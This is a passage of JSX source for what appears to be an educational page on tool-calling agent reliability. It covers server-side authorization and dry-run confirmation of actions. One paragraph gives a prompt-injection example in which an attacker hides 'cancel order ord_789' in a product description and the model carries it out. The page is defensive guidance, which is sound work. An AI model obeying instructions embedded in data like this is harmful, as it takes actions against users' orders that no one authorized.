        <Pill type="red">What it looks like</Pill> The model says cancel_order("ord_456") and you execute it without checking if the user owns that order, or if the order is cancellable, or if ord_456 even exists. "The model is smart, it would not call cancel on the wrong order."
        <br /><br />
        <strong>Why it fails:</strong> The model hallucinates IDs (it saw ord_456 in training data, not in this conversation). In multi-tenant systems, it confuses users. Via prompt injection, an attacker embeds "cancel order ord_789" in a product description. The model obediently calls the tool.
        <br /><br />
        <Pill type="green">Fix</Pill> Server-side authorization on EVERY tool call. The tool itself checks: does this user own this order? Is this order cancellable? The agent is the user's assistant, not a trusted system component. Treat every tool call argument as untrusted user input — because that is exactly what it is, filtered through an LLM.
      </Decision></FadeIn>

      <FadeIn delay={400}><Insight>
        The single most impactful pattern you can add to any tool-calling agent: dry_run mode. Before actually cancelling an order, the tool returns "This would cancel order #456 ($89.99, placed yesterday, 3 items). Proceed?" The model shows this to the user. The user confirms. Then the tool executes for real. This one pattern catches hallucinated IDs, wrong orders, prompt injection attacks, and user mistakes — all at once. Cost: one extra round-trip. Benefit: zero accidental mutations. Every production agent should have this.
      </Insight></FadeIn>

      <FadeIn delay={500}><Insight tag="Production insight">
        When someone asks "how do you make tool calling reliable?" -- do NOT start with retry logic. Start with schema design (right tool granularity, good descriptions), then dispatch (validation, timeouts, structured errors), then error recovery (retry only transient, circuit breaker, escape hatch), then security (permission tiers, provenance tracking, sandboxing). Thinking about the problem in layers, from prevention to detection to recovery, is the engineering maturity signal.
      </Insight></FadeIn>
        </div>
  );
}

const styles = {
  back: { fontSize: 12, color: 'var(--text-muted)', textDecoration: 'none', fontFamily: 'var(--font-mono)' },
  eyebrow: { fontSize: 11, fontWeight: 500, color: 'var(--text-accent)', letterSpacing: '0.08em', marginBottom: 8, textTransform: 'uppercase', fontFamily: 'var(--font-mono)' },
  h1: { fontSize: 'clamp(28px, 5vw, 44px)', fontWeight: 400, color: 'var(--text-h)', lineHeight: 1.12, marginBottom: 16, fontFamily: 'var(--font-display)', letterSpacing: '-0.02em' },
  subtitle: { fontSize: 15, color: 'var(--text-p)', lineHeight: 1.75, marginBottom: 32 },
  tabWrap: { display: 'flex', flexWrap: 'wrap', gap: 4, marginBottom: 28, borderBottomWidth: 1, borderBottomStyle: 'solid', borderBottomColor: 'var(--border)', paddingBottom: 12 },
  tabBtn: { fontSize: 12, fontWeight: 500, color: 'var(--text-muted)', background: 'none', border: 'none', padding: '6px 14px', borderRadius: 'var(--radius-full)', cursor: 'pointer', transition: 'all var(--dur) var(--ease)', fontFamily: 'var(--font-body)' },
  tabActive: { color: 'var(--text-accent)', background: 'var(--bg-accent)' },
  sh: { fontSize: 20, fontWeight: 600, color: 'var(--text-h)', marginBottom: 8, fontFamily: 'var(--font-display)', letterSpacing: '-0.01em' },
  ss: { fontSize: 14, color: 'var(--text-p)', lineHeight: 1.7, marginBottom: 20 },
};
